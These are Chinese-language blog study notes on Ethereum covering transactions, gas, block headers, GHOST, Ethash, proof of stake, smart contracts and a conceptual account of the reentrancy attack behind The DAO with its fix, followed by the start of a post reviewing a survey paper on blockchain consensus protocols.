<h1 id="3-交易"><a href="#3-交易" class="headerlink" title="3. 交易"></a>3. 交易</h1><h2 id="交易信息"><a href="#交易信息" class="headerlink" title="交易信息"></a>交易信息</h2><p>交易(Transactions)是由<strong>外部持有账户（即普通账户）发送的</strong>，包含如下信息：</p>
<ul>
<li><p><code>recipient</code> - 接收地址，可以是普通账户，<strong>也可以是合约账户</strong>。</p>
</li>
<li><p><code>signature</code> - 发送者的签名。</p>
</li>
<li><p><code>value</code> - 交易的金额，以Wei为单位。</p>
</li>
<li><p><code>data</code> - 一些可选的数据字段。</p>
</li>
<li><p><code>STARTGAS</code> - 表示允许交易执行的最大计算步骤数（当实际计算步骤大于这个值时，交易将不会被执行），单位是gas。通常一个计算步骤花费1gas或者更多。</p>
</li>
<li><p><code>GASPRICE</code> - 表示支付方为每个计算步骤支付的费用，即每个gas需支付多少以太币。</p>
</li>
</ul>
<p>汽油费Gas是一个单位，用于衡量交易执行所消耗的资源。</p>
<p>以太坊规定，交易执行所导致的每个计算、存储都需要消耗费用，而设计gas限额是为了防止恶意者发布无限循环代码或者浪费计算资源。</p>
<h2 id="消息（一种特殊的交易）"><a href="#消息（一种特殊的交易）" class="headerlink" title="消息（一种特殊的交易）"></a>消息（一种特殊的交易）</h2><p>消息(Messages)由<strong>合约账户向另一个合约账户</strong>发送，包含如下信息：</p>
<ul>
<li><p>消息的发送者（隐含）</p>
</li>
<li><p>消息的接收者</p>
</li>
<li><p>与消息一起传输的ether数量</p>
</li>
<li><p>一个可选的数据字段</p>
</li>
<li><p>一个<code>STARTGAS</code>值</p>
</li>
</ul>
<p>当正在执行的合约执行到<code>CALL</code>操作码时，就会产生一条消息。交易或合约指定的gas限额，适用于该交易和<strong>所有次级执行</strong>所消耗的总gas。例如，外部账户A向合约账户B发送了一笔1000 gas的交易，B已花费了600 gas，此时执行<code>CALL</code>指令向合约C发送消息，C执行完花费300 gas，那B还剩100 gas。</p>
<h2 id="交易执行"><a href="#交易执行" class="headerlink" title="交易执行"></a>交易执行</h2><ol>
<li><p>检查交易是否格式正确，签名是否有效，以及nonce是否与发送者帐户中的nonce匹配。</p>
</li>
<li><p>计算交易手续费&#x2F;汽油费&#x3D;<code>STARTGAS * GASPRICE</code>，并从签名中确定发送者账户。从发送者帐户的余额中减去这笔费用，并增加发送者的nonce。如果发送者没有足够的余额，则返回错误。</p>
</li>
<li><p>初始化<code>GAS = STARTGAS</code>，并先根据交易的字节数支付一定量的gas（存储也需消耗gas）。</p>
</li>
<li><p>将交易额从发送者帐户转移到接收者帐户。如果接收帐户尚不存在，就创建它。如果接收帐户是合约，则运行合约的代码，要么执行完成，要么gas被消耗完。</p>
</li>
<li><p>如果发送者账户没有足够的金额，或者代码执行耗尽了gas，或者出现错误，则<strong>回滚除了支付汽油费之外的所有状态</strong>，并将汽油费添加到矿工的帐户（<strong>已消耗的汽油费不退</strong>，防止恶意节点浪费资源）。</p>
</li>
<li><p>如果一切顺利执行完，则将<strong>剩余的gas费用退还给发送者</strong>，并将消耗的gas费用发送给矿工。</p>
</li>
</ol>
<p>举例：假设存在一个合约账户，初始状态中，存储为空，代码（实际上合约代码是用低级EVM代码编写的，这个例子是用Serpent编写的，这是以太坊的高级语言之一，可以被编译成EVM代码）如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> !self.storage[calldataload(<span class="number">0</span>)]:</span><br><span class="line">  self.storage[calldataload(<span class="number">0</span>)] = calldataload(<span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<p>此时，有一笔交易发送到合约账户，它包含10 ether，2000 gas（gas价格是0.001个ether）和64个字节的数据，字节0-31存储着数字<code>2</code>，字节32-63存储着字符串<code>CHARLIE</code>。交易执行的过程如下：</p>
<ol>
<li><p>检查交易是否有效且格式正确。</p>
</li>
<li><p>检查交易发送者是否至少有2000*0.001 &#x3D; 2 ether。如果有，则从发送者的帐户中减去2 ether。</p>
</li>
<li><p>初始化gas&#x3D;2000。假设交易总长度是170字节，且每个字节的费用是5 gas，则减去170*5 &#x3D; 850 gas，还剩1150 gas。</p>
</li>
<li><p>从发送者的帐户中再减去10 ether，并将其添加到合约的帐户中。</p>
</li>
<li><p>运行代码。代码中<code>calldataload(i)</code>是取交易数据中字节i位置的值，因此代码的作用是：检查<code>self.storage[2]</code>存储中索引2处有没有值，若没有值，则将字符串<code>CHARLIE</code>存储到这。假设这需要187 gas，那么gas剩余1150 - 187 &#x3D; 963。</p>
</li>
<li><p>将963 * 0.001 &#x3D; 0.963 ether返回发送者帐户，并返回结果状态。</p>
</li>
</ol>
<p>如果交易是发送给普通账户的，那么交易手续费直接等于<code>GASPRICE</code> * 交易的字节长度。</p>
<p>另外，消息的回滚与交易的回滚一样。<strong>如果消息执行消耗完gas，消息的执行和其触发的次级执行都会回滚。但是，父级执行不会回滚。</strong></p>
<h1 id="4-区块"><a href="#4-区块" class="headerlink" title="4. 区块"></a>4. 区块</h1><h2 id="区块头"><a href="#区块头" class="headerlink" title="区块头"></a>区块头</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Header <span class="keyword">struct</span> &#123;</span><br><span class="line">  ParentHash  common.Hash    <span class="string">`json:&quot;parentHash&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">  UncleHash   common.Hash    <span class="string">`json:&quot;sha3Uncles&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">  Coinbase    common.Address <span class="string">`json:&quot;miner&quot;            gencodec:&quot;required&quot;`</span></span><br><span class="line">  Root        common.Hash    <span class="string">`json:&quot;stateRoot&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">  TxHash      common.Hash    <span class="string">`json:&quot;transactionsRoot&quot; gencodec:&quot;required&quot;`</span></span><br><span class="line">  ReceiptHash common.Hash    <span class="string">`json:&quot;receiptsRoot&quot;     gencodec:&quot;required&quot;`</span></span><br><span class="line">  Bloom       Bloom          <span class="string">`json:&quot;logsBloom&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">  Difficulty  *big.Int       <span class="string">`json:&quot;difficulty&quot;       gencodec:&quot;required&quot;`</span></span><br><span class="line">  Number      *big.Int       <span class="string">`json:&quot;number&quot;           gencodec:&quot;required&quot;`</span></span><br><span class="line">  GasLimit    <span class="type">uint64</span>         <span class="string">`json:&quot;gasLimit&quot;         gencodec:&quot;required&quot;`</span></span><br><span class="line">  GasUsed     <span class="type">uint64</span>         <span class="string">`json:&quot;gasUsed&quot;          gencodec:&quot;required&quot;`</span></span><br><span class="line">  Time        <span class="type">uint64</span>         <span class="string">`json:&quot;timestamp&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">  Extra       []<span class="type">byte</span>         <span class="string">`json:&quot;extraData&quot;        gencodec:&quot;required&quot;`</span></span><br><span class="line">  MixDigest   common.Hash    <span class="string">`json:&quot;mixHash&quot;`</span></span><br><span class="line">  Nonce       BlockNonce     <span class="string">`json:&quot;nonce&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ParentHash - 父区块块头的哈希值</p>
</li>
<li><p>UncleHash - 叔叔区块块头的哈希值</p>
</li>
<li><p>Coinbase - 挖出区块矿工的地址</p>
</li>
<li><p>Root - 状态树的Hash</p>
</li>
<li><p>TxHash - 交易树的Hash</p>
</li>
<li><p>ReceiptHash -收据树的Hash</p>
</li>
<li><p>Bloom - 布隆过滤器，帮助轻节点筛选区块中是否存在需要的收据信息</p>
</li>
<li><p>Difficulty - 挖矿难度</p>
</li>
<li><p>Number - 区块序号</p>
</li>
<li><p>GasLimit - 区块中所有交易所消耗的gas总量必须低于该值。挖出区块的矿工可以对该值进行微调：$上一个区块的GasLimit \pm \frac{1}{1024}$ ，<strong>最终这个值会趋于一个大家都觉得合理的值</strong>。</p>
</li>
<li><p>GasUsed - 区块中所有交易实际消耗的gas总量</p>
</li>
<li><p>Time - 区块创建时间</p>
</li>
<li><p>Extra - 额外信息</p>
</li>
<li><p>MixDigest - 区块哈希</p>
</li>
<li><p>Nonce - 挖矿使用的随机数</p>
</li>
</ul>
<h2 id="区块验证"><a href="#区块验证" class="headerlink" title="区块验证"></a>区块验证</h2><ol>
<li><p>检查引用的前一个区块是否存在且有效。</p>
</li>
<li><p>检查区块的时间戳是否大于前一个区块的时间戳，并且比当前时刻不超过15分钟。</p>
</li>
<li><p>检查区块编号、难度、交易树根(transaction root)、叔叔区块根(uncle root)和gas限制是否有效。</p>
</li>
<li><p>检查区块上的工作量证明是否有效。</p>
</li>
<li><p>以前一个区块的状态为初始状态，依次执行区块中的交易。如果任何交易执行失败，或者消耗的总gas超过<code>GASLIMIT</code>，则返回错误。</p>
</li>
<li><p>若都执行成功，将出块奖励添加到矿工账户。</p>
</li>
<li><p>检查最终状态的Merkle树根是否等于区块头中提供的最终状态根。如果是，则该区块有效;否则，它无效。</p>
</li>
</ol>
<h1 id="5-共识"><a href="#5-共识" class="headerlink" title="5. 共识"></a>5. 共识</h1><h2 id="工作量证明PoW"><a href="#工作量证明PoW" class="headerlink" title="工作量证明PoW"></a>工作量证明PoW</h2><h3 id="以太坊GHOST"><a href="#以太坊GHOST" class="headerlink" title="以太坊GHOST"></a>以太坊GHOST</h3><p>比特币的平均出块时间为10分钟（通过挖矿难度控制），一笔交易被确认写入区块链需要1小时（6个区块），如此高的延迟对于日常交易是极其不便的。但如果出块时间过快，又会导致系统容易被攻击（比如双花攻击）。因为，<strong>区块在网络中传播需要时间，如果出块时间小于网络传播时间，就会导致算力分散（当新区块传播到对方时，对方的新区块甚至第二个新区块都已经产生了）</strong>。从而导致攻击者即使不够51%算力，也能发动攻击。如下图，攻击者A集中算力私自产生6个区块，即使它未超过系统总算力一半(6&#x2F;18)，也能超过最长链：</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_RJts9bGaXG.png"></p>
<p><strong>GHOST（Greedy Heaviest Observed Subtree，贪婪的最重要的观察子树）</strong>协议由Yonatan Sompolinsky和Aviv Zohar于<a href="https://eprint.iacr.org/2013/881.pdf" title="2013年12月">2013年12月</a>首次推出，是一种<strong>主链选择协议</strong>，为了解决出块时间缩短导致系统不安全的问题。它在选取主链时，不是根据长度，而是根据<strong>子树中区块的数量</strong>，因此GHOST也可被称为最重子树原则。如上图，面对1B和1A的分叉，GHOST会选择1B，因为1B所在子树中区块数量更多，接着选择2C→3D→4B。</p>
<p>比特币中还存在一大问题：算力中心化。时至今日，最大的矿池已占系统总算力的30%。当出块时间过快时，大矿池可能主导挖矿过程。进而导致其它矿工的算力被浪费，无法获得奖励，其积极性也被打压。</p>
<p>以太坊在GHOST协议上作出修改，既保证主链的安全，又使得与主链相连的孤块也能获取收益。具体定义如下：</p>
<ul>
<li><p>区块必须指定父区块，同时还可以指定0-2个叔叔区块。</p>
</li>
<li><p>区块<code>B</code>中指向的叔叔区块必须具有以下属性：</p>
</li>
<li><p>它必须是<code>B</code>的第<code>k</code>代祖先的直接子区块，其中<code>2 &lt;= k &lt;= 7</code>（注：第1代祖先指自己，第2代祖先指父区块，第3代祖先指爷爷区块）。</p>
</li>
<li><p>它不能是<code>B</code>的祖先。</p>
</li>
<li><p>叔叔区块必须是有效的区块头，但<strong>不需要是先前验证、甚至有效的区块，区块中交易不需要执行</strong>。</p>
</li>
<li><p>叔叔区块不能被双重包含。</p>
</li>
<li><p>对于区块<code>B</code>包含的每个叔叔区块，<code>B</code>的矿工获得额外1&#x2F;32的出块奖励，叔叔区块的矿工获得的<code>(8-k+1)/8</code>出块奖励（注：父区块的子区块获得7&#x2F;8奖励，爷爷区块的子区块获得6&#x2F;8，直到2&#x2F;8）。</p>
</li>
</ul>
<p>上述定义的作用：</p>
<ol>
<li><p>避免算力中心化，激发个体矿工积极性。</p>
</li>
<li><p>鼓励大家沿着主链挖矿而不是攻击链（即便攻击链更长，但主链上叔叔区块更多），从而<strong>达到GHOST<strong><strong>选择</strong></strong>最重子树的效果</strong>。</p>
</li>
</ol>
<p>为什么规定7代之内的叔叔区块才有奖励？因为不限制的话，有可能包含前100代的叔叔区块，那全节点要保存的区块数据将非常庞大（因为要验证叔叔区块不能被重复包含）。</p>
<h3 id="以太坊挖矿算法ETHASH"><a href="#以太坊挖矿算法ETHASH" class="headerlink" title="以太坊挖矿算法ETHASH"></a>以太坊挖矿算法ETHASH</h3><p>比特币中，矿工通过不断调整区块头数据，并用SHA256计算区块头哈希，使区块哈希小于目标难度值，从而达成工作量证明，即成功挖出区块。随着比特币的飞速发展，挖矿过程逐渐<strong>专业化和中心化</strong>。首先，挖矿的芯片已由普通CPU转向了ASIC等专业芯片。其次，挖矿越来越趋于中心化，依赖于中心化矿池，排名前几的矿池已拥有超过系统50%的算力。普通人难以参与到挖矿过程中，这显然违背了中本聪创建比特币时”one-CPU-one-vote”的初衷。</p>
<p>为了抵制专用芯片导致的挖矿专业化，一种方法是设计<strong>Memory-Hard(花费大量内存)挖矿算法</strong>：在挖矿时不仅要考虑算力，还需考虑内存。因为，专业挖矿芯片的哈希计算能力强，但内存访问效率并不高。如果在挖矿算法中不仅要求计算哈希，还需要不断访问内存，<strong>算法瓶颈就会受内存访问速率的限制（冯诺依曼体系的问题）</strong>。那会不会出现计算能力和内存访问都高效的新设备呢？会，但不会像ASIC芯片那样拥有极高的哈希计算能力，因为受制于内存访问速率。而如果能让内存访问速度和芯片计算速度一样，那将是计算机领域的重大突破。目前，以太坊主要是使用GPU和部分专业矿机挖矿，而比特币只能使用专业矿机挖矿，这说明ETHASH能一定程度上抵制专业矿机，但无法杜绝挖矿越来越卷。</p>
<p>设计Memory-Hard算法还需考虑的一个问题是：<strong>如何方便轻节点验证？</strong>如果内存要求太大，轻节点将无法验证（轻节点内存有限）。而如果要求太小，又起不到明显的抵制作用（缓存可以解决）。莱特币也采用了Memory-Hard挖矿算法，但只要求168K的内存，最终并未起到显著效果。但莱特币凭借着可抵制专业矿机的宣传，解决了<strong>冷启动问题</strong>（货币初期没人使用的问题）。</p>
<p>为了既能保证Memory-Hard，又方便轻节点验证，以太坊设计了挖矿算法<strong>ETHASH</strong>。算法过程如下：</p>
<p>算法初始化：</p>
<ul>
<li><p>通过一个seed种子生成一个16MB的缓存数组cache：cache[0]&#x3D;keccak512(seed)，cache[i]&#x3D;keccak512(cache[i-1])，<strong>keccak512</strong>是第三代哈希算法(SHA-3)。</p>
</li>
<li><p>再根据缓存数组生成一个1GB的数据集数组dataset，也被称为DAG。数组中第i个元素的生成过程如下：</p>
</li>
</ul>
<p>  <img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_EQCCBPVEI0.png"></p>
<ul>
<li>每隔30000个区块，seed会重新生成，缓存数组和数据集数组的大小也会增大一次，增大初始大小的1&#x2F;128。</li>
</ul>
<p>dataset数组用于全节点挖矿，cache数组用于轻节点验证。dataset数组中每个元素都可通过cache数组计算生成。全节点挖矿时，需要不断计算区块哈希，而计算区块哈希又需要频繁访问dataset数组，<strong>为了节省时间，全节点会在内存中保存dataset数组</strong>。而轻节点验证时，只需计算一次区块哈希，则可<strong>临时</strong>通过cache数组计算出dataset数组中相应位置的值。挖矿和验证的伪代码如下：</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_G7DHhNvFQK.png"></p>
<p>为什么要抵制ASIC专业矿机？为了让普通计算机也参与到系统中，参与的计算机越多越能保证系统的安全性。但也有人认为专业矿机更能保证系统安全，因为攻击者想要攻击系统必须购买专业矿机，而专业矿机只适用于某一种加密货币，无法通用。因此攻击者发动攻击的成本更高，如果攻击失败，矿机只能挖矿或出售；如果攻击成功，加密货币声誉受损、价值暴跌，矿机又没用了。</p>
<p>值得一提的是，ETHASH算法仍属于PoW范畴，而以太坊已计划向PoS转移。</p>
<h2 id="权益证明PoS"><a href="#权益证明PoS" class="headerlink" title="权益证明PoS"></a>权益证明PoS</h2><p>工作量证明(PoW)是由中本聪提出的一种共识机制，已在比特币中得到充分的安全性验证。但它消耗大量电力资源的问题，也被广为诟病。<strong>权益证明机制(Proof of Stake, PoS)</strong> 是一种新的共识机制，它根据参与者的权益（比如持有币的数量）投票达成共识（类似于股份制），大幅减少电力消耗。以太坊将要使用的PoS算法为：<strong>Casper</strong>，但目前依旧处于探索阶段。</p>
<p>对于PoW的电力消耗，存在另一种声音：挖矿所消耗的电力并不算太大，同时很多发电厂产生的电力并不能被充分使用，甚至被浪费。而大部分矿池修建在发电厂旁边，能够更好将电力转换为金钱。</p>
<h1 id="6-智能合约"><a href="#6-智能合约" class="headerlink" title="6. 智能合约"></a>6. 智能合约</h1><p>在以太坊中，智能合约是一种账户，拥有余额也能发送交易。此外，合约账户还拥有<code>code</code>字段（用于存储代码）和<code>storage</code>字段（用于存储数据）。<strong>用户可以通过向合约发送交易，来执行合约中的相关代码</strong>。</p>
<h2 id="合约创建-x2F-部署"><a href="#合约创建-x2F-部署" class="headerlink" title="合约创建&#x2F;部署"></a>合约创建&#x2F;部署</h2><p>智能合约可先由Solidity、Vyper等高级语言编写，再编译成字节码（EVM代码，类似汇编代码），然后才能部署到以太坊上。当部署合约时，<strong>外部账户发起一笔收款地址为0x0的转账交易，并将编译好的合约代码放在交易的data域中</strong>。交易的转账金额是0，但需支付gas汽油费。当交易被成功写入区块链时，就意味着合约被成功创建。</p>
<h2 id="合约代码执行"><a href="#合约代码执行" class="headerlink" title="合约代码执行"></a>合约代码执行</h2><p>合约账户保存的代码是由基于堆栈的字节码语言编写的，是一种低级语言，被称为“以太坊虚拟机代码”或“EVM代码”。EVM代码就像一个字节数组，<strong>每个字节可表示一个操作码，每个操作都会消耗一定量的汽油费(gas)。</strong> 比如操作码<code>ADD</code>，将栈顶两个元素弹出并相加，消耗3 gas。代码会依次执行，每次执行程序计数器(pc)都会加1，直到代码结束、或遇到错误、或执行到<code>STOP/RETURN</code>指令。</p>
<p>代码可以访问的数据空间：</p>
<ul>
<li><p><strong>堆栈</strong>，栈。</p>
</li>
<li><p><strong>内存</strong>，一个无限可扩展的字节数组。</p>
</li>
<li><p>合约的<strong>存储</strong>，键&#x2F;值存储。与堆栈和内存不同，堆栈和内存在计算结束后重置，而存储会持久化。</p>
</li>
<li><p>消息的金额值、发送者、数据，以及区块头数据</p>
</li>
</ul>
<p>代码可以返回数据的字节数组作为输出。</p>
<p>注意：</p>
<ul>
<li><p>为了保证一致性，<strong>智能合约不支持多线程</strong>。因为不同线程对内存访问顺序不一致的话，执行结果可能不一致。</p>
</li>
<li><p>智能合约的代码**一旦发布就不能修改(code is law)**，好处是谁也无法修改规则，坏处是无法修复漏洞。</p>
</li>
</ul>
<h2 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h2><p>一个用于拍卖的智能合约代码示例：</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_monpTD7cZ-.png"></p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_v6dQXBRZUQ.png"></p>
<p>其中，withdraw函数由投标者调用，用于取回出价。函数代码中，<code>msg.sender.call.value(amount)</code>是向消息的发送方（也就是代码的调用者）发送amount数量的以太币。</p>
<p>代码逻辑初看没有问题，但却存在致命漏洞。攻击者先创建一个合约账户HackV2，在账户的代码中定义<strong>fallback函数（匿名函数，当向合约地址转账而不指定函数时，或指定函数不存在时，fallback函数会被调用）</strong>，并在fallback函数中调用拍卖合约的withdraw函数。然后，攻击者就可以发动攻击：</p>
<ol>
<li><p>攻击者以合约账户HackV2的身份加入拍卖；</p>
</li>
<li><p>拍卖结束后，攻击者通过合约账户HackV2的hack_withdraw函数，调用拍卖合约中的withdraw函数取回自己的出价。当withdraw函数执行到<code>msg.sender.call.value(amount)</code>时，会向HackV2账户发送一笔转账交易，交易会触发HackV2的fallback函数。而fallback函数又会调用拍卖合约中withdraw向自己转账，如此无限递归调用，直到gas汽油费被耗尽。如此，攻击者将获得数倍于出价的金额。</p>
</li>
</ol>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_y9T_KSBzSy.png"></p>
<p>出现这个漏洞的原因是：withdraw函数先转账再将对应账户的余额置为0，而转账操作可以触发无限递归。正确的写法是先将账户余额置为0再转账，修改如下：</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE2-0%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A/image_35mtf8Vr94.png"></p>
<p>2016年，以太坊发生著名的**“The DAO”事件**，其原因就是黑客对合约发动重入攻击。为了挽救损失，以太坊社区决定发动硬分叉回滚：开发团队发布以太坊新版本，在代码中强制The DAO合约相关账户的钱转到另一个合约，甚至不需要私钥。但由于部分人不赞成这种回滚，从而导致以太币分化成两个版本ETH和ETC，延续至今。</p>
<h1 id="7-反思"><a href="#7-反思" class="headerlink" title="7. 反思"></a>7. 反思</h1><p>肖老师课程倒数第二节内容：</p>
<ul>
<li><p>Is smart contract really smart?</p>
</li>
<li><p>Irrevocability is a double edged sword.</p>
</li>
<li><p>Noting is irrevocability.</p>
</li>
<li><p>Is solidity the right programming language?</p>
</li>
<li><p>What is decentralize mean? 在The DAO事件中，部分人为了去中心化信仰，拒绝硬分叉。但硬分叉真的破坏了去中心化吗？以太坊开发团队虽然能发布升级，但最终实现硬分叉是因为<strong>大部分矿工同意更新</strong>，以太坊团队<strong>并不能强制矿工执行</strong>。所以，这还是一个去中心化的过程。</p>
</li>
</ul>
<blockquote>
<p>去中心化的规则并不是不能修改，而是要用去中心化的方法来完成。分叉恰恰是民主的一种体现。</p>
</blockquote>
<ul>
<li><p>decentralized ≠distributed。去中心必定是分布式，但分布式不一定去中心化。</p>
</li>
<li><p>以太坊虽然能实现大规模分布式一致性，但性能并不高。所以它<strong>并不适用于大规模计算和存储</strong>，而更适用于编写关键逻辑。</p>
</li>
</ul>
<h1 id="8-总结"><a href="#8-总结" class="headerlink" title="8. 总结"></a>8. 总结</h1><p>13岁的V神沉迷暴雪公司的魔兽世界，可是有一天暴雪公司把他很喜欢的一个技能删除了，他多次发邮件反应，但都得不到想要的答复。V神很气愤，凭什么暴雪公司不征求用户意见，想删除就删除。怀揣着对这种中心化公司任性行为的不满，V神在他19岁那年，发布了以太坊白皮书，开创了区块链2.0时代。</p>
<p>比特币开创了区块链时代，但它仅仅实现了交易的去中心化。而以太坊让各式各样的去中心化应用成为可能，去中心化的拍卖、去中心化的慈善募捐、去中心化的投资等等。以太坊的出现，吸引了许多像V神这样对中心化不满的人们，他们从以太坊上看到了去中心化的光明未来。但随着热潮褪去，随着The DAO等安全事件的发生，我们发现去中心化还有很长的路要走，我们也不能盲目地推崇去中心化。</p>
<p>去中心化一定是万能的吗？去中心化一定好吗？去中心化与中心化一定是非黑即白的吗？去中心化意味着民主，但也存在效率低下、决策正确性等问题。而在一些场景，中心化已经表现得很好，就不必使用去中心化了，比如：在奶茶店买一杯奶茶，使用微信付款只需片刻，而若使用比特币你将等待1个小时。另外，对于The DAO这种去中心化风投，其效益还真不一定比中心化的专业风投机构高。其实，中心化与去中心化并不互斥，而是可以相辅相成，比如：在中心化的平台上使用用去中心化的交易方式。关于中心化与去中心化，映射到现实，就类似于专制与民主，值得深思与探讨。（参考肖老师课程最后一节）</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.bilibili.com/video/BV1Vt411X7JF" title="北京大学肖臻老师《区块链技术与应用》公开课_哔哩哔哩_bilibili">北京大学肖臻老师《区块链技术与应用》公开课_哔哩哔哩_bilibili</a></p>
<ul>
<li><p><a href="https://ethereum.org/zh/whitepaper/" title="Ethereum Whitepaper | ethereum.org">Ethereum Whitepaper | ethereum.org</a></p>
</li>
<li><p><a href="https://github.com/ethereum/wiki/wiki/[Chinese-Simplified]-Ethereum-%E7%99%BD%E7%9A%AE%E4%B9%A6%E4%B8%AD%E6%96%87%E7%89%88" title="[Chinese Simplified] Ethereum 白皮书中文版 · ethereum/wiki Wiki (github.com)">[Chinese Simplified] Ethereum 白皮书中文版 · ethereum&#x2F;wiki Wiki (github.com)</a></p>
</li>
<li><p><a href="https://ethereum.org/zh/developers/docs/" title="以太坊开发文档 | ethereum.org">以太坊开发文档 | ethereum.org</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链之共识——解读《区块链共识协议综述》</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B.html</url>
    <content><![CDATA[<p>论文：夏清,窦文生,郭凯文,梁赓,左春,张凤军.区块链共识协议综述.软件学报,2021,32(2):277−299. <a href="http://www.jos.org.cn/1000-9825/6150.htm">http://www.jos.org.cn/1000-9825/6150.htm</a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>共识是指：群体中各个独立的参与者，就某件事情达成一致。比如：公司的董事会根据某个决策，进行讨论、投票、最终达成一致的过程，就是一种共识。根据<strong>是否存在恶意参与者</strong> ，共识可分为<strong>崩溃容错（crash fault tolerant，简称CFT）</strong> 和<strong>拜占庭容错（Byzantine fault tolerant，简称BFT）</strong> 两大类。崩溃容错是指：在不存在恶意节点的情况下，即使某个节点崩溃，系统也能正常运行并达成共识，它常用于中心化的分布式数据库中。而拜占庭容错，名字来源于著名的拜占庭将军问题，指存在恶意者的情况下，整体还能否达成正确的共识，比如：将军们的军事议会中混进了叛徒，决策是否会被影响。</p>
<p>共识作为区块链的核心技术，一直是区块链的重中之重。毫不夸张地说，比特币成功的关键是它独到的共识机制。而正是比特币的共识机制，使得大规模、分布式、拜占庭容错共识成为了可能。因此，了解区块链相关共识协议是研究区块链不可或缺的一步（当然也为了完成读书报告任务）。</p>
<p>本文主要以解读<a href="http://www.jos.org.cn/1000-9825/6150.htm">《区块链共识协议综述》</a>为主，大多内容提炼自原文。论文虽是中文，但愚以为质量可观，感兴趣可阅读原文。</p>
<span id="more"></span>

<h1 id="论文解读"><a href="#论文解读" class="headerlink" title="论文解读"></a>论文解读</h1><blockquote>
<p>区块链共识协议分为两个主要步骤:出块节点选举和主链共识.在出块节点选举阶段,某个节点(或多个节点)成为出块节点,提出新区块.由于分布式网络中可能存在的恶意节点及分叉块的影响,其他节点在收到新区块以后不能直接将其加入自己的本地区块链中.所有节点需要利用主链共识对新区块及其构成的主链达成一致.</p>
</blockquote>
<p>区块链共识协议分为两个主要步骤：</p>
<ul>
<li><strong>出块节点选举</strong> ，类似于领导人选举。</li>
<li><strong>主链共识</strong> 。</li>
</ul>
<blockquote>
<p>在出块节点选举机制部分,我们主要围绕目前已得到广泛研究与应用的工作量证明和权益证明展开讨论,总结工作量证明和权益证明机制存在的问题,从解决问题的角度讨论了随后出现的各种替代性证明机制.在主链共识部分,我们根据主链共识的性质,将主链共识分为概率性共识和确定性共识两类.在概率性共识中,我们讨论了各种主链选取规则,包括最长链规则[2]、GHOST[12]、包容性协议[26]等,并从概率性共识的持久性和活性角度对上述规则进行分析比较.在确定性共识中,我们首先讨论了经典的拜占庭协议[27]以及其应用到区块链中需要解决的问题,随后讨论了各种基于拜占庭容错协议达成一致的共识算法,包括 Algorand 的 BA*协议[14]、Byzcoin 的 PBFT 协议[15]、Stellar 的 SCP 协议[28]及 Honeybadger[16],并从确定性共识的安全性和活性角度对各种协议进行分析比较.</p>
</blockquote>
<p>在出块节点选举机制部分，论文主要讨论<strong>工作量证明</strong> 和<strong>权益证明</strong> ，总结存在的问题，从解决问题的角度讨论了随后出现的各种替代性证明机制。</p>
<p>在主链共识部分，论文根据主链共识的性质，将主链共识分为<strong>概率性共识</strong> 和<strong>确定性共识</strong> 两类：</p>
<ul>
<li>在概率性共识中，讨论各种主链选取规则，包括最长链规则、GHOST、包容性协议等，并从持久性和活性角度进行分析比较。</li>
<li>在确定性共识中，论文首先讨论了经典的拜占庭协议以及其应用到区块链中需要解决的问题，随后讨论了各种基于拜占庭容错协议达成一致的共识算法，包括Algorand的BA*协议、Byzcoin的PBFT协议、Stellar的SCP协议及Honeybadger，并从安全性和活性角度进行分析比较。</li>
</ul>
<h2 id="1-区块链共识协议"><a href="#1-区块链共识协议" class="headerlink" title="1 区块链共识协议"></a>1 区块链共识协议</h2><blockquote>
<p>区块链共识协议属于拜占庭容错协议,保证区块链网络中诚实节点在恶意节点干扰下也能达成共识.在分布式系统中,依据系统对故障组件的容错能力,共识协议分为<strong>崩溃容错协议(crash fault tolerant,简称 CFT)</strong> 和<strong>拜占庭容错协议(Byzantine fault tolerant,简称 BFT)</strong> 两大类[20].CFT 协议保证系统在组件宕机的情况下也能达成共识,适用于中心化的分布式数据集群,例如 Google 分布式锁服务 Chubby[29]、Paxos[30]协议等.BFT 协议由 LeslieLamport 在 1982 年提出,保证分布式系统在故障组件[31,32]的干扰下依然可以达成一致性.由于区块链网络的开放性质,区块链共识协议需要抵御恶意节点干扰,因此属于 BFT 协议.</p>
</blockquote>
